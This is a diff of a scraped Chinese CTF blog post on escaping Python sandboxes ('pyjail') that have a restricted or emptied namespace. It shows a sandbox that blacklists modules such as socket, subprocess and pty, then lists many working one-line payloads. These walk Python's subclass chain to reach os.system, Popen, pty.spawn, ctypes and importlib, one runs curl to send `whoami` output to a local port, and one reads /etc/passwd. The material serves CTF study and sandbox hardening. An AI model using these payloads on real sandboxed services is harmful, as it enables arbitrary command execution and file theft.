@@ -1,6 +1,6 @@
 # pyjail bypass-03 绕过命名空间限制 _ DummyKitty's Blog
 
-> 原文: https://dummykitty.github.io/posts/pyjail-bypass-03-%E7%BB%95%E8%BF%87%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E9%99%90%E5%88%B6/#%E5%AE%8C%E5%85%A8%E9%99%90%E5%88%B6no-builtins
+> URL: https://dummykitty.github.io/posts/pyjail-bypass-03-%E7%BB%95%E8%BF%87%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E9%99%90%E5%88%B6/#%E5%AE%8C%E5%85%A8%E9%99%90%E5%88%B6no-builtins
 
 __
 
@@ -12,7 +12,7 @@ __ __ Cancel
 
 Posted  May 30, 2023  Updated  Jun 15, 2025 
 
-[![Preview Image](images/image_1.jpg)](/assets/images/pyjail.jpg)
+[![Preview Image](images/p1.jpg)](/assets/images/pyjail.jpg)
 
 By _[DummyKitty](https://twitter.com/DummyKitty) _
 
@@ -49,10 +49,78 @@ __
 
 ____
 
-```` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 def _hook_import_(name, *args, **kwargs): module_blacklist = ['os', 'sys', 'time', 'bdb', 'bsddb', 'cgi', 'CGIHTTPServer', 'cgitb', 'compileall', 'ctypes', 'dircache', 'doctest', 'dumbdbm', 'filecmp', 'fileinput', 'ftplib', 'gzip', 'getopt', 'getpass', 'gettext', 'httplib', 'importlib', 'imputil', 'linecache', 'macpath', 'mailbox', 'mailcap', 'mhlib', 'mimetools', 'mimetypes', 'modulefinder', 'multiprocessing', 'netrc', 'new', 'optparse', 'pdb', 'pipes', 'pkgutil', 'platform', 'popen2', 'poplib', 'posix', 'posixfile', 'profile', 'pstats', 'pty', 'py_compile', 'pyclbr', 'pydoc', 'rexec', 'runpy', 'shlex', 'shutil', 'SimpleHTTPServer', 'SimpleXMLRPCServer', 'site', 'smtpd', 'socket', 'SocketServer', 'subprocess', 'sysconfig', 'tabnanny', 'tarfile', 'telnetlib', 'tempfile', 'Tix', 'trace', 'turtle', 'urllib', 'urllib2', 'user', 'uu', 'webbrowser', 'whichdb', 'zipfile', 'zipimport'] for forbid in module_blacklist: if name == forbid: # don't let user import these modules raise RuntimeError('No you can\' import {0}!!!'.format(forbid)) # normal modules can be imported return __import__(name, *args, **kwargs) def sandbox_exec(command): # sandbox user input result = 0 __sandboxed_builtins__ = dict(__builtins__.__dict__) __sandboxed_builtins__['__import__'] = _hook_import_ # hook import del __sandboxed_builtins__['open'] _global = { '__builtins__': __sandboxed_builtins__ } ... exec command in _global # do calculate in a sandboxed ... ````
+`_``` 
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+```_|  _``` 
+def _hook_import_(name, *args, **kwargs):
+    module_blacklist = ['os', 'sys', 'time', 'bdb', 'bsddb', 'cgi',
+                        'CGIHTTPServer', 'cgitb', 'compileall', 'ctypes', 'dircache',
+                        'doctest', 'dumbdbm', 'filecmp', 'fileinput', 'ftplib', 'gzip',
+                        'getopt', 'getpass', 'gettext', 'httplib', 'importlib', 'imputil',
+                        'linecache', 'macpath', 'mailbox', 'mailcap', 'mhlib', 'mimetools',
+                        'mimetypes', 'modulefinder', 'multiprocessing', 'netrc', 'new',
+                        'optparse', 'pdb', 'pipes', 'pkgutil', 'platform', 'popen2', 'poplib',
+                        'posix', 'posixfile', 'profile', 'pstats', 'pty', 'py_compile',
+                        'pyclbr', 'pydoc', 'rexec', 'runpy', 'shlex', 'shutil', 'SimpleHTTPServer',
+                        'SimpleXMLRPCServer', 'site', 'smtpd', 'socket', 'SocketServer',
+                        'subprocess', 'sysconfig', 'tabnanny', 'tarfile', 'telnetlib',
+                        'tempfile', 'Tix', 'trace', 'turtle', 'urllib', 'urllib2',
+                        'user', 'uu', 'webbrowser', 'whichdb', 'zipfile', 'zipimport']
+    for forbid in module_blacklist:
+        if name == forbid:        # don't let user import these modules
+            raise RuntimeError('No you can\' import {0}!!!'.format(forbid))
+    # normal modules can be imported
+    return __import__(name, *args, **kwargs)
 
-  1. 沙箱首先获取 ` ``` __builtins__ ``` `，然后依据现有的 ` ``` __builtins__ ``` ` 来构建命名空间。
-  2. 修改 ` ``` __import__ ``` ` 函数为自定义的` ``` _hook_import_ ``` `
+def sandbox_exec(command):      # sandbox user input
+    result = 0
+    __sandboxed_builtins__ = dict(__builtins__.__dict__)
+    __sandboxed_builtins__['__import__'] = _hook_import_    # hook import
+    del __sandboxed_builtins__['open']
+    _global = {
+        '__builtins__': __sandboxed_builtins__
+    }
+
+    ...
+        exec command in _global     # do calculate in a sandboxed  
+    ...
+```_  
+---|---  
+`
+
+  1. 沙箱首先获取 `__builtins__`，然后依据现有的 `__builtins__` 来构建命名空间。
+  2. 修改 `__import__` 函数为自定义的`_hook_import_`
   3. 删除 open 函数防止文件操作
   4. exec 命令。
 
@@ -60,19 +128,59 @@ ____
 
 绕过方式：
 
-由于 exec 运行在特定的命名空间里，可以通过获取其他命名空间里的 ` ``` __builtins__ ``` `（这个` ``` __builtins__ ``` `保存的就是原始` ``` __builtins__ ``` `的引用），比如 types 库，来执行任意命令：
+由于 exec 运行在特定的命名空间里，可以通过获取其他命名空间里的 `__builtins__`（这个`__builtins__`保存的就是原始`__builtins__`的引用），比如 types 库，来执行任意命令：
 
 ____
 
-```` 1 2 __import__('types').__builtins__ __import__('string').__builtins__ ````
+`_``` 
+1
+2
+```_|  _``` 
+__import__('types').__builtins__
+__import__('string').__builtins__
+```_  
+---|---  
+`
 
-###  完全限制(no builtins)__
+### 完全限制(no builtins)__
 
-如果沙箱完全清空了` ``` __builtins__ ``` `, 则无法使用 import,如下：
+如果沙箱完全清空了`__builtins__`, 则无法使用 import,如下：
 
 ____
 
-```` 1 2 3 4 5 6 7 8 9 10 11 12 13 14>>> eval("__import__", {"__builtins__": {}},{"__builtins__": {}}) Traceback (most recent call last): File "<stdin>", line 1, in <module> File "<string>", line 1, in <module> NameError: name '__import__' is not defined >>> eval("__import__") <built-in function __import__> >>> exec("import os") >>> exec("import os",{"__builtins__": {}},{"__builtins__": {}}) Traceback (most recent call last): File "<stdin>", line 1, in <module> File "<string>", line 1, in <module> ImportError: __import__ not found ``` `
+`_``` 
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+```_|  _``` 
+>>> eval("__import__", {"__builtins__": {}},{"__builtins__": {}})
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+  File "<string>", line 1, in <module>
+NameError: name '__import__' is not defined
+>>> eval("__import__")
+<built-in function __import__>
+
+>>> exec("import os")
+>>> exec("import os",{"__builtins__": {}},{"__builtins__": {}})
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+  File "<string>", line 1, in <module>
+ImportError: __import__ not found
+```_  
+---|---  
+`
 
 这种情况下我们就需要利用 python 继承链来绕过，其步骤简单来说，就是通过 python 继承链获取内置类, 然后通过这些内置类获取到敏感方法例如 os.system 然后再进行利用。
 
@@ -84,17 +192,109 @@ ____
 
 ____
 
-```` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 # os [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("ls") # subprocess [ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen'][0]('ls') # builtins [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_GeneratorContextManagerBase" and "os" in x.__init__.__globals__ ][0]["__builtins__"] # help [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_GeneratorContextManagerBase" and "os" in x.__init__.__globals__ ][0]["__builtins__"]['help'] [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]['__builtins__'] #sys [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls") [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls") #commands (not very common) [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls") #pty (not very common) [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls") #importlib [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls") [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls") #imp [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls") [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls") #pdb [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls") # ctypes [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__('ctypes').CDLL(None).system('ls /'.encode()) # multiprocessing [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__('multiprocessing').Process(target=lambda: __import__('os').system('curl localhost:9999/?a=`whoami`')).start() ````
+`_``` 
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+```_|  _``` 
+# os
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("ls")
 
-####  File __
+# subprocess 
+[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen'][0]('ls')
+
+# builtins
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_GeneratorContextManagerBase" and "os" in x.__init__.__globals__ ][0]["__builtins__"]
+
+# help
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_GeneratorContextManagerBase" and "os" in x.__init__.__globals__ ][0]["__builtins__"]['help']
+
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]['__builtins__']
+
+#sys
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
+
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")
+
+#commands (not very common)
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")
+
+#pty (not very common)
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")
+
+#importlib
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")
+
+#imp
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")
+
+#pdb
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
+
+# ctypes
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__('ctypes').CDLL(None).system('ls /'.encode())
+
+# multiprocessing
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__('multiprocessing').Process(target=lambda: __import__('os').system('curl localhost:9999/?a=`whoami`')).start()
+```_  
+---|---  
+`
+
+#### File __
 
 操作文件可以使用 builtins 中的 open，也可以使用 FileLoader 模块的 get_data 方法。
 
 ____
 
-```` 1 [ x for x in ''.__class__.__base__.__subclasses__() if x.__name__=="FileLoader" ][0].get_data(0,"/etc/passwd") ````
+`_``` 
+1
+```_|  _``` 
+[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__=="FileLoader" ][0].get_data(0,"/etc/passwd")
+```_  
+---|---  
+`
 
-##  参考资料 __
+## 参考资料 __
 
   * [Python沙箱逃逸小结](https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals)
   * [Python 沙箱逃逸的经验总结](https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E5%89%8D%E8%A8%80)
@@ -120,26 +320,6 @@ This post is licensed under [ CC BY 4.0 ](https://creativecommons.org/licenses/b
 
 Share [ __](https://twitter.com/intent/tweet?text=pyjail%20bypass-03%20%E7%BB%95%E8%BF%87%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E9%99%90%E5%88%B6%20-%20DummyKitty's%20Blog&url=%2Fposts%2Fpyjail-bypass-03-%25E7%25BB%2595%25E8%25BF%2587%25E5%2591%25BD%25E5%2590%258D%25E7%25A9%25BA%25E9%2597%25B4%25E9%2599%2590%25E5%2588%25B6%2F "Twitter") [ __](https://www.facebook.com/sharer/sharer.php?title=pyjail%20bypass-03%20%E7%BB%95%E8%BF%87%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E9%99%90%E5%88%B6%20-%20DummyKitty's%20Blog&u=%2Fposts%2Fpyjail-bypass-03-%25E7%25BB%2595%25E8%25BF%2587%25E5%2591%25BD%25E5%2590%258D%25E7%25A9%25BA%25E9%2597%25B4%25E9%2599%2590%25E5%2588%25B6%2F "Facebook") [ __](https://t.me/share/url?url=%2Fposts%2Fpyjail-bypass-03-%25E7%25BB%2595%25E8%25BF%2587%25E5%2591%25BD%25E5%2590%258D%25E7%25A9%25BA%25E9%2597%25B4%25E9%2599%2590%25E5%2588%25B6%2F&text=pyjail%20bypass-03%20%E7%BB%95%E8%BF%87%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E9%99%90%E5%88%B6%20-%20DummyKitty's%20Blog "Telegram") __
 
-## Recently Updated
-
-  * [TFCCTF 2025 Πjail - syscall 降权绕过](/posts/TFCCTF-2025-%CE%A0jail/)
-  * [TFCCTF 2025 minijail - Bash 下有限字符的极限构造](/posts/TFCCTF-2025-minijail-Bash%E4%B8%8B%E6%9C%89%E9%99%90%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9E%81%E9%99%90%E6%9E%84%E9%80%A0/)
-  * [Ubuntu 20.04 ppa:ondrej/php 源失效😨](/posts/Ubuntu-20.04-PPA-%E6%BA%90%E5%A4%B1%E6%95%88/)
-  * [php phar 反序列化利用](/posts/php-phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/)
-  * [php 反序列化原生类利用](/posts/php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/)
-
-
-
 ## Trending Tags
 
 [pyjail](/tags/pyjail/) [Deserialization](/tags/deserialization/) [thinkphp](/tags/thinkphp/) [xss](/tags/xss/) [debug](/tags/debug/) [nodejs](/tags/nodejs/) [prototype-pollution](/tags/prototype-pollution/) [RASP](/tags/rasp/) [web](/tags/web/) [0ctf 2023](/tags/0ctf-2023/)
-
-## Contents
-
-### Further Reading
-
-## Trending Tags
-
-[pyjail](/tags/pyjail/) [Deserialization](/tags/deserialization/) [thinkphp](/tags/thinkphp/) [xss](/tags/xss/) [debug](/tags/debug/) [nodejs](/tags/nodejs/) [prototype-pollution](/tags/prototype-pollution/) [RASP](/tags/rasp/) [web](/tags/web/) [0ctf 2023](/tags/0ctf-2023/)
-
-__
